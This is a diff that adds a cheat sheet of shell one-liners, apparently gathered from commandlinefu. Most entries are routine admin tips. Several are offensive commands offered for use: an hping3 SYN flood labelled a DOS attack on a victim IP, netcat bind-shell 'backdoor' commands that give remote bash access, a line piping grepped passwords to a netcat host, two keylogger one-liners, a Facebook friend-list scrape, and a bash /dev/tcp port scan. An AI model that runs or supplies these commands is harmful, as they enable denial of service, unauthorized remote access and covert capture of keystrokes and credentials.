@@ -1,0 +1,316 @@
+Scan all open ports without any required program
+
+for i in {1..65535}; do (echo < /dev/tcp/127.0.0.1/$i) &>/dev/null && printf "\n[+] Open Port at\n: \t%d\n" "$i" || printf "."; done
+
+
+##############################################################################################################################
+
+Replace strings in text
+-e is the script function, it performs search and replace like vi, and -i is the edit the file in place.
+
+sed -e 's/dapper/edgy/g' -i /etc/apt/sources.list
+
+
+##############################################################################################################################
+
+
+
+Show your current network interface in use
+route | grep -m1 ^default | awk '{print $NF}'
+
+
+##############################################################################################################################
+
+
+
+Calculate the distance between two geographic coordinates points (latitude longitude)
+The Haversine formula determines the great-circle distance between two points on a sphere given their longitudes and latitudes. Show Sample Output
+
+h(){ echo $@|awk '{d($1,$2,$3,$4);} function d(x,y,x2,y2,a,c,dx,dy){dx=r(x2-x);dy=r(y2-y);x=r(x);x2=r(x2);a=(sin(dx/2))^2+cos(x)*cos(x2)*(sin(dy/2))^2;c=2*atan2(sqrt(a),sqrt(1-a)); printf("%.4f",6372.8*c);} function r(g){return g*(3.1415926/180.);}';}
+
+
+
+##############################################################################################################################
+
+
+[POWERSHELL/WINDOWS ONLY]
+Application network trace based on application name
+This command takes an application name as an argument and then it will listen to the tcp traffic and capture packets matching the process Id of the application. The output shows: local address / local port / Remote Address / Remote port / State / Owning Process ID Show Sample Output
+
+while(1 -eq 1 ) {Get-Process -Name *APPNAME* | Select-Object -ExpandProperty ID | ForEach-Object {Get-NetTCPConnection -OwningProcess $_} -ErrorAction SilentlyContinue }
+
+
+##############################################################################################################################
+
+
+
+
+Check every URL redirect (HTTP status codes 301/302) with curl
+
+curl -sLkIv --stderr - https://exemple.com | awk 'BEGIN{IGNORECASE = 1};/< location:/ {print $3}'
+
+
+##############################################################################################################################
+
+
+
+
+Recursive search and replace (with bash only)
+Replaces a string matching a pattern in one or several files found recursively in a particular folder.
+
+
+find ./ -type f -name "somefile.txt" -exec sed -i -e 's/foo/bar/g' {} \;
+
+
+
+##############################################################################################################################
+
+
+
+
+Check every URL redirect (HTTP status codes 301/302) with curl
+curl -sLkIv --stderr - https://t.co/2rQjHfptZ8 -s: silences the output when piped to a different command -L: follow every redirect -k: ignores certificate errors -I: just request the headers -v: be verbose --stderr - : redirect stderr to stdout https://t.co/2rQjHfptZ8: URL to check for redirects piped to grep -i location: -i: grep target text ignoring case location: : greps every string containing "location:" piped to awk {'print $3'} prints the third column in every string piped to sed '/^$/d' removes blank lines Show Sample Output
+
+curl -sLkIv --stderr - http://example.org | grep -i location: | awk {'print $3'} | sed '/^$/d'
+
+
+
+##############################################################################################################################
+
+
+Commandlinefu 1
+
+-find all active IP addresses in a network
+I just added the args [arp-scan --localnet] which works for Debian users, because the package 'arp' has name 'arp-scan', and it doesn't works with the argument 'arp'.
+
+nmap -sP 192.168.1.0/24; arp-scan --localnet | grep "192.168.1.[0-9]* *ether"
+
+
+
+--Ping all hosts on 192.168.1.0/24
+
+nmap -sP 192.168.0.1-254
+
+-b option takes the broadcast address.
+
+ping -b 192.168.0.255
+
+
+##############################################################################################################################
+
+
+
+--DOS attack
+Perform a DOS attack from Linux using hping3 DOS=Denial-of-Service
+
+hping3 --rand-source -p 80 -S --flood Victim_ip
+
+
+##############################################################################################################################
+
+
+
+--Release memory used by the Linux kernel on caches
+=1 --> to free pagecache =2 --> to free dentries and inodes =3 --> to free pagecache, dentries and inodes
+
+/sbin/sysctl -w vm.drop_caches=3
+
+
+##############################################################################################################################
+
+
+
+--keylogger
+python -c "DEV = '/dev/input/event4' #if event0 doesn't work, try event1 event2 etc fo = open(DEV) def interpret(keycode,state): if state == 0: print '%i up'%keycode if state == 1: print '%i down'%keycode if state == 2: print '%i repeat'%keycode while 1: line = fo.read(16) if ord(line[10]) != 0: keycode,state = line[10],line[12] interpret(ord(keycode),ord(state)) " 
+
+python -c "DEV = '/dev/input/event4' fo = open(DEV) def inn(k,s): if s == 0: print '%i up'%k if s == 1: print '%i down'%k while 1: l = fo.read(16) if ord(l[10]) != 0: k,s = l[10],l[12] inn(ord(k),ord(s)) "
+
+
+##############################################################################################################################
+
+
+
+--Display the top 10 running processes - sorted by memory usage
+A pretty nice display of processes. Show Sample Output
+
+ps -eo rss,vsz,pid,cputime,cmd --width 100 --sort rss,vsz | tail --lines 10
+
+
+##############################################################################################################################
+
+
+
+--View facebook friend list [hidden or not hidden] (3 ways)
+
+lynx -useragent=Opera -dump 'http://www.facebook.com/ajax/typeahead_friends.php?u=Bilal Butt&__a=1' |gawk -F'\"t\":\"' -v RS='\",' 'RT{print $NF}' |grep -v '\"n\":\"' |cut -d, -f2
+
+fbcmd FSTATUS =all
+
+php -r "echo ini_get('allow_url_fopen');" php -r "echo function_exists('curl_init');" php -r "echo function_exists('json_decode');"
+
+
+##############################################################################################################################
+
+
+
+--mtr, better than traceroute and ping combined
+mtr combines the functionality of the traceroute and ping programs in a single network diagnostic tool. As mtr starts, it investigates the network connection between the host mtr runs on and HOSTNAME. by sending packets with purposly low TTLs. It continues to send packets with low TTL, noting the response time of the intervening routers. This allows mtr to print the response percentage and response times of the internet route to HOSTNAME. A sudden increase in packetloss or response time is often an indication of a bad (or simply over‐loaded) link.
+
+mtr google.com
+
+
+##############################################################################################################################
+
+
+
+--Execute a command without saving it in the history
+Prepending one or more spaces to your command won't be saved in history. Useful for pr0n or passwords on the commandline. Tested on BASH.
+
+<space>command
+
+
+##############################################################################################################################
+
+
+
+--default ssh tunnel plus recovers automatically after failure. do not forget the sleep!
+
+while :; do ssh cp@192.168.1.19 -L8081:localhost:80 -N -v -g ; sleep 100; done
+
+
+##############################################################################################################################
+
+
+
+--Create a backdoor on a machine to allow remote connection to bash
+This will launch a listener on the machine that will wait for a connection on port 1234. When you connect from a remote machine with something like : nc 192.168.0.1 1234 You will have console access to the machine through bash. 
+
+nc -vv -l -p 1234 -e /bin/bash
+
+
+
+
+--echo grep -iRe 'pass(wd)?'| nc 192.168.0.1 1234
+could possibly tell the bot/intruder your password, which then gives them root access.
+
+My netcat doesn't have the -e option. How I replace it? Ubuntu 10.4
+try the alternate by despseekingsatan
+
+
+--Create a backdoor on a machine to allow remote connection to bash
+My netcat (nc-1.84-10.fc6) doesn't have the -e option, so I have to do it like this. Of course, instead of bash, you can use any executable, including scripts.
+
+/bin/bash | nc -l 1234
+
+
+##############################################################################################################################
+
+
+
+--One line keylogger
+
+xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 xinput test
+
+Taken from: https://unix.stackexchange.com/questions/129159/record-every-keystroke-and-store-in-a-file Author: Stephane Chazelas
+
+
+
+##############################################################################################################################
+
+
+
+
+--Gathering all MAC's in your local network
+
+sudo arp-scan --interface=eth0 -l
+
+
+
+##############################################################################################################################
+
+
+
+--look busy
+Not as taxing on the CPU.
+
+while [ true ]; do head -n 100 /dev/urandom; sleep .1; done | hexdump -C | grep "ca fe"
+
+
+
+##############################################################################################################################
+
+
+
+-Run the last command as root
+Useful when you forget to use sudo for a command. "!!" grabs the last run command.
+
+sudo !!
+
+
+
+##############################################################################################################################
+
+
+
+-Query Wikipedia via console over DNS
+Query Wikipedia by issuing a DNS query for a TXT record. The TXT record will also include a short URL to the complete corresponding Wikipedia entry.You can also write a little shell script like: $ cat wikisole.sh #!/bin/sh dig +short txt ${1}.wp.dg.cx and run it like ./wikisole.sh unix were your first option ($1) will be used as search term. Show Sample Output
+
+dig +short txt <keyword>.wp.dg.cx
+
+
+
+
+##############################################################################################################################
+
+
+
+-Download an entire website
+-p parameter tells wget to include all files, including images. -e robots=off you don't want wget to obey by the robots.txt file -U mozilla as your browsers identity. --random-wait to let wget chose a random number of seconds to wait, avoid get into black list. Other Useful wget Parameters: --limit-rate=20k limits the rate at which it downloads files. -b continues wget after logging out. -o $HOME/wget_log.txt logs the output
+
+wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com
+
+
+
+##############################################################################################################################
+
+
+
+--list block devices
+Shows all block devices in a tree with descruptions of what they are.
+
+sudo lsblk -o name,type,fstype,label,partlabel,model,mountpoint,size
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
